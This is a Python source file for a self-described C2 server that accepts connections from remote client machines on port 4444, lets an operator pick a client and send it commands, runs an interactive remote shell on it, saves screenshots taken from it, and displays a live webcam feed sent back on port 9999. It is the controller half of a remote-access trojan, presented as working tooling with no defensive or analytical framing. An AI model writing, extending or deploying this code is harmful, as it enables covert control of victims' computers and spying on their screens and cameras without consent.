import socket
import threading
import os
import time
import base64
import msvcrt
import ctypes
import struct
import cv2
import numpy as np

clients = []

# Handle client session
def handle_client(client_socket, address):
    print(f"[+] New client: {address}")
    clients.append((client_socket, address))

# Receive screenshot data and save
def save_screenshot(data):
    filename = f"screenshot_{int(time.time())}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(data))
    print(f"[+] Screenshot saved as {filename}")

# Handle live camera stream
def handle_camera_stream():
    cam_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cam_server.bind(("0.0.0.0", 9999))
    cam_server.listen(1)
    print("[*] Waiting for camera stream connection...")
    try:
        cam_socket, cam_addr = cam_server.accept()
        print(f"[+] Camera stream connected from {cam_addr}")

        while True:
            data_len = cam_socket.recv(4)
            if not data_len:
                break
            frame_size = struct.unpack(">I", data_len)[0]
            frame_data = b""
            while len(frame_data) < frame_size:
                packet = cam_socket.recv(frame_size - len(frame_data))
                if not packet:
                    break
                frame_data += packet

            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            if frame is None or frame.size == 0:
                print("[!] Received empty frame. Skipping...")
                continue

            cv2.imshow("Live Camera", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    except Exception as e:
        print(f"[!] Error during camera stream: {e}")
    finally:
        cam_socket.close()
        cam_server.close()
        cv2.destroyAllWindows()

# Command console
def command_console():
    selected = None
    while True:
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key == b'\x03':  # Ctrl+C
                if msvcrt.kbhit() and msvcrt.getch() == b'\x03':
                    print("\n[!] Exiting C2 server...")
                    os._exit(0)

        if not clients:
            print("[*] Waiting for clients...")
            time.sleep(3)
            continue

        print("\nConnected Clients:")
        for i, (_, addr) in enumerate(clients):
            print(f"{i + 1}. {addr[0]}:{addr[1]}")

        try:
            selected = int(input("Select client by number: ")) - 1
            if selected < 0 or selected >= len(clients):
                print("[!] Invalid selection")
                continue
        except ValueError:
            print("[!] Invalid input")
            continue

        client_socket, addr = clients[selected]
        while True:
            try:
                command = input(f"Command for {addr[0]}:{addr[1]} > ")
                if command.strip().lower() == "exit":
                    break
                client_socket.send(command.encode())

                if command.startswith("screenshot"):
                    data = b""
                    while True:
                        chunk = client_socket.recv(4096)
                        if chunk.endswith(b"<END>"):
                            data += chunk[:-5]
                            break
                        data += chunk
                    save_screenshot(data)
                elif command.startswith("message"):
                    print("[*] Message command sent")
                elif command.strip().lower() == "shell":
                    print("[*] Entering shell mode. Type 'exit' to leave.")
                    while True:
                        cmd = input("shell> ")
                        if cmd.strip().lower() == "exit":
                            client_socket.send(b"exit")
                            break
                        client_socket.send(cmd.encode())
                        result = client_socket.recv(4096).decode(errors="ignore")
                        print(result)
                else:
                    result = client_socket.recv(4096).decode(errors="ignore")
                    print(result)
            except Exception as e:
                print(f"[!] Client disconnected: {e}")
                clients.pop(selected)
                break

# Main listener
def start_server(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] C2 server listening on {host}:{port}")

    threading.Thread(target=handle_camera_stream, daemon=True).start()
    threading.Thread(target=command_console, daemon=True).start()

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
